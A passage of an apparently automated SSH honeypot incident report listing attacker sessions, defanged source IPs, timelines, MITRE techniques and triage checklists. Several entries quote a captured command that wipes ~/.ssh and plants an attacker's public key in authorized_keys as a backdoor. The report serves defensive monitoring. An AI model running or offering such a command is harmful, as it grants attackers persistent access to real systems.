| `2026-05-24 16:06:44` | `cowrie.session.file_download` |
| `2026-05-24 16:06:44` | `cowrie.log.closed` |
| `2026-05-24 16:06:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.56.11[.]2` to AbuseIPDB if not already reported
- [ ] Block `186.56.11[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb74f2f7c822

| Field | Detail |
|---|---|
| **Source IP** | `186.56.11[.]2` |
| **First Seen** | 2026-05-24 16:06 |
| **Last Seen** | 2026-05-24 16:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:06:48` | `cowrie.session.connect` |
| `2026-05-24 16:06:48` | `cowrie.client.version` |
| `2026-05-24 16:06:49` | `cowrie.client.kex` |
| `2026-05-24 16:06:51` | `cowrie.login.success` |
| `2026-05-24 16:06:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.56.11[.]2` to AbuseIPDB if not already reported
- [ ] Block `186.56.11[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24baf11e9f58

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]186` |
| **First Seen** | 2026-05-24 16:08 |
| **Last Seen** | 2026-05-24 16:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:08:06` | `cowrie.session.connect` |
| `2026-05-24 16:08:06` | `cowrie.client.version` |
| `2026-05-24 16:08:07` | `cowrie.client.kex` |
| `2026-05-24 16:08:07` | `cowrie.login.success` |
| `2026-05-24 16:08:07` | `cowrie.session.params` |
| `2026-05-24 16:08:07` | `cowrie.command.input` |
| `2026-05-24 16:08:07` | `cowrie.command.failed` |
| `2026-05-24 16:08:07` | `cowrie.log.closed` |
| `2026-05-24 16:08:08` | `cowrie.session.params` |
| `2026-05-24 16:08:08` | `cowrie.command.input` |
| `2026-05-24 16:08:08` | `cowrie.session.file_download` |
| `2026-05-24 16:08:08` | `cowrie.log.closed` |
| `2026-05-24 16:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]186` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c18e09d180d

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]186` |
| **First Seen** | 2026-05-24 16:08 |
| **Last Seen** | 2026-05-24 16:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:08:09` | `cowrie.session.connect` |
| `2026-05-24 16:08:09` | `cowrie.client.version` |
| `2026-05-24 16:08:10` | `cowrie.client.kex` |
| `2026-05-24 16:08:10` | `cowrie.login.success` |
| `2026-05-24 16:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]186` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78fcbce7b485

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]186` |
| **First Seen** | 2026-05-24 16:11 |
| **Last Seen** | 2026-05-24 16:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:11:46` | `cowrie.session.connect` |
| `2026-05-24 16:11:46` | `cowrie.client.version` |
| `2026-05-24 16:11:47` | `cowrie.client.kex` |
| `2026-05-24 16:11:47` | `cowrie.login.success` |
| `2026-05-24 16:11:47` | `cowrie.session.params` |
| `2026-05-24 16:11:47` | `cowrie.command.input` |
| `2026-05-24 16:11:47` | `cowrie.command.failed` |
| `2026-05-24 16:11:47` | `cowrie.log.closed` |
| `2026-05-24 16:11:47` | `cowrie.session.params` |
| `2026-05-24 16:11:47` | `cowrie.command.input` |
| `2026-05-24 16:11:48` | `cowrie.session.file_download` |
| `2026-05-24 16:11:48` | `cowrie.log.closed` |
| `2026-05-24 16:11:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]186` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a80ba07554e

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]186` |
| **First Seen** | 2026-05-24 16:11 |
| **Last Seen** | 2026-05-24 16:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:11:49` | `cowrie.session.connect` |
| `2026-05-24 16:11:49` | `cowrie.client.version` |
| `2026-05-24 16:11:49` | `cowrie.client.kex` |
| `2026-05-24 16:11:50` | `cowrie.login.success` |
| `2026-05-24 16:11:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]186` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac4b691146da

| Field | Detail |
|---|---|
| **Source IP** | `45.78.194[.]242` |
| **First Seen** | 2026-05-24 16:17 |
| **Last Seen** | 2026-05-24 16:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:17:48` | `cowrie.session.connect` |
| `2026-05-24 16:17:48` | `cowrie.client.version` |
| `2026-05-24 16:17:48` | `cowrie.client.kex` |
| `2026-05-24 16:17:49` | `cowrie.login.success` |
| `2026-05-24 16:17:49` | `cowrie.session.params` |
| `2026-05-24 16:17:49` | `cowrie.command.input` |
| `2026-05-24 16:17:49` | `cowrie.command.failed` |
| `2026-05-24 16:17:49` | `cowrie.log.closed` |
| `2026-05-24 16:17:49` | `cowrie.session.params` |
| `2026-05-24 16:17:49` | `cowrie.command.input` |
| `2026-05-24 16:17:49` | `cowrie.session.file_download` |
| `2026-05-24 16:17:49` | `cowrie.log.closed` |
| `2026-05-24 16:17:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.194[.]242` to AbuseIPDB if not already reported
- [ ] Block `45.78.194[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c10af3c7adaa

| Field | Detail |
|---|---|
| **Source IP** | `45.78.194[.]242` |
| **First Seen** | 2026-05-24 16:17 |
| **Last Seen** | 2026-05-24 16:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:17:51` | `cowrie.session.connect` |
| `2026-05-24 16:17:51` | `cowrie.client.version` |
| `2026-05-24 16:17:51` | `cowrie.client.kex` |
| `2026-05-24 16:17:52` | `cowrie.login.success` |
| `2026-05-24 16:17:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.194[.]242` to AbuseIPDB if not already reported
- [ ] Block `45.78.194[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53abe2c97e8c

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]186` |
| **First Seen** | 2026-05-24 16:19 |
| **Last Seen** | 2026-05-24 16:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:19:15` | `cowrie.session.connect` |
| `2026-05-24 16:19:15` | `cowrie.client.version` |
| `2026-05-24 16:19:15` | `cowrie.client.kex` |
| `2026-05-24 16:19:15` | `cowrie.login.success` |
| `2026-05-24 16:19:16` | `cowrie.session.params` |
| `2026-05-24 16:19:16` | `cowrie.command.input` |
| `2026-05-24 16:19:16` | `cowrie.command.failed` |
| `2026-05-24 16:19:16` | `cowrie.log.closed` |
| `2026-05-24 16:19:16` | `cowrie.session.params` |
| `2026-05-24 16:19:16` | `cowrie.command.input` |
| `2026-05-24 16:19:16` | `cowrie.session.file_download` |
| `2026-05-24 16:19:16` | `cowrie.log.closed` |
| `2026-05-24 16:19:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]186` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba149b4c3edd

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]186` |
| **First Seen** | 2026-05-24 16:19 |
| **Last Seen** | 2026-05-24 16:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:19:18` | `cowrie.session.connect` |
| `2026-05-24 16:19:18` | `cowrie.client.version` |
| `2026-05-24 16:19:18` | `cowrie.client.kex` |
| `2026-05-24 16:19:18` | `cowrie.login.success` |
| `2026-05-24 16:19:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]186` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-123d00eb9fff

| Field | Detail |
|---|---|
| **Source IP** | `186.56.11[.]2` |
| **First Seen** | 2026-05-24 16:22 |
| **Last Seen** | 2026-05-24 16:22 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:22:24` | `cowrie.session.connect` |
| `2026-05-24 16:22:24` | `cowrie.client.version` |
| `2026-05-24 16:22:25` | `cowrie.client.kex` |
| `2026-05-24 16:22:26` | `cowrie.login.success` |
| `2026-05-24 16:22:27` | `cowrie.session.params` |
| `2026-05-24 16:22:27` | `cowrie.command.input` |
| `2026-05-24 16:22:27` | `cowrie.command.failed` |
| `2026-05-24 16:22:28` | `cowrie.log.closed` |
| `2026-05-24 16:22:28` | `cowrie.session.params` |
| `2026-05-24 16:22:28` | `cowrie.command.input` |
| `2026-05-24 16:22:29` | `cowrie.session.file_download` |
| `2026-05-24 16:22:29` | `cowrie.log.closed` |
| `2026-05-24 16:22:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.56.11[.]2` to AbuseIPDB if not already reported
- [ ] Block `186.56.11[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a76def6e396f

| Field | Detail |
|---|---|
| **Source IP** | `186.56.11[.]2` |
| **First Seen** | 2026-05-24 16:22 |
| **Last Seen** | 2026-05-24 16:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:22:34` | `cowrie.session.connect` |
| `2026-05-24 16:22:34` | `cowrie.client.version` |
| `2026-05-24 16:22:35` | `cowrie.client.kex` |
| `2026-05-24 16:22:37` | `cowrie.login.success` |
| `2026-05-24 16:22:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.56.11[.]2` to AbuseIPDB if not already reported
- [ ] Block `186.56.11[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1659eac48688

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]186` |
| **First Seen** | 2026-05-24 16:23 |
| **Last Seen** | 2026-05-24 16:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:23:05` | `cowrie.session.connect` |
| `2026-05-24 16:23:05` | `cowrie.client.version` |
| `2026-05-24 16:23:05` | `cowrie.client.kex` |
| `2026-05-24 16:23:05` | `cowrie.login.success` |
| `2026-05-24 16:23:05` | `cowrie.session.params` |
| `2026-05-24 16:23:05` | `cowrie.command.input` |
| `2026-05-24 16:23:05` | `cowrie.command.failed` |
| `2026-05-24 16:23:06` | `cowrie.log.closed` |
| `2026-05-24 16:23:06` | `cowrie.session.params` |
| `2026-05-24 16:23:06` | `cowrie.command.input` |
| `2026-05-24 16:23:06` | `cowrie.session.file_download` |
| `2026-05-24 16:23:06` | `cowrie.log.closed` |
| `2026-05-24 16:23:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]186` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cc045a93b9c

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]186` |
| **First Seen** | 2026-05-24 16:23 |
| **Last Seen** | 2026-05-24 16:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:23:08` | `cowrie.session.connect` |
| `2026-05-24 16:23:08` | `cowrie.client.version` |
| `2026-05-24 16:23:08` | `cowrie.client.kex` |
| `2026-05-24 16:23:08` | `cowrie.login.success` |
| `2026-05-24 16:23:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]186` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c61b5ea6e421

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]186` |
| **First Seen** | 2026-05-24 16:26 |
| **Last Seen** | 2026-05-24 16:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:26:52` | `cowrie.session.connect` |
| `2026-05-24 16:26:52` | `cowrie.client.version` |
| `2026-05-24 16:26:52` | `cowrie.client.kex` |
| `2026-05-24 16:26:52` | `cowrie.login.success` |
| `2026-05-24 16:26:52` | `cowrie.session.params` |
| `2026-05-24 16:26:52` | `cowrie.command.input` |
| `2026-05-24 16:26:52` | `cowrie.command.failed` |
| `2026-05-24 16:26:53` | `cowrie.log.closed` |
| `2026-05-24 16:26:53` | `cowrie.session.params` |
| `2026-05-24 16:26:53` | `cowrie.command.input` |
| `2026-05-24 16:26:53` | `cowrie.session.file_download` |
| `2026-05-24 16:26:53` | `cowrie.log.closed` |
| `2026-05-24 16:26:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]186` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed3bd06dafcc

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]186` |
| **First Seen** | 2026-05-24 16:26 |
| **Last Seen** | 2026-05-24 16:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:26:55` | `cowrie.session.connect` |
| `2026-05-24 16:26:55` | `cowrie.client.version` |
| `2026-05-24 16:26:55` | `cowrie.client.kex` |
| `2026-05-24 16:26:55` | `cowrie.login.success` |
| `2026-05-24 16:26:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]186` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88c9ec8478ef

| Field | Detail |
|---|---|
| **Source IP** | `186.56.11[.]2` |
| **First Seen** | 2026-05-24 16:27 |
| **Last Seen** | 2026-05-24 16:27 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:27:47` | `cowrie.session.connect` |
| `2026-05-24 16:27:47` | `cowrie.client.version` |
| `2026-05-24 16:27:47` | `cowrie.client.kex` |
| `2026-05-24 16:27:49` | `cowrie.login.success` |
| `2026-05-24 16:27:50` | `cowrie.session.params` |
| `2026-05-24 16:27:50` | `cowrie.command.input` |
| `2026-05-24 16:27:50` | `cowrie.command.failed` |
| `2026-05-24 16:27:51` | `cowrie.log.closed` |
| `2026-05-24 16:27:52` | `cowrie.session.params` |
| `2026-05-24 16:27:52` | `cowrie.command.input` |
| `2026-05-24 16:27:52` | `cowrie.session.file_download` |
| `2026-05-24 16:27:52` | `cowrie.log.closed` |
| `2026-05-24 16:27:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.56.11[.]2` to AbuseIPDB if not already reported
- [ ] Block `186.56.11[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b4b5f281c17

| Field | Detail |
|---|---|
| **Source IP** | `186.56.11[.]2` |
| **First Seen** | 2026-05-24 16:27 |
| **Last Seen** | 2026-05-24 16:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 16:27:56` | `cowrie.session.connect` |
| `2026-05-24 16:27:56` | `cowrie.client.version` |
| `2026-05-24 16:27:57` | `cowrie.client.kex` |
| `2026-05-24 16:27:59` | `cowrie.login.success` |
| `2026-05-24 16:27:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.56.11[.]2` to AbuseIPDB if not already reported
- [ ] Block `186.56.11[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a1c326dbec9

| Field | Detail |
|---|---|
| **Source IP** | `103.183.75[.]60` |
| **First Seen** | 2026-05-24 16:31 |
| **Last Seen** | 2026-05-24 16:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
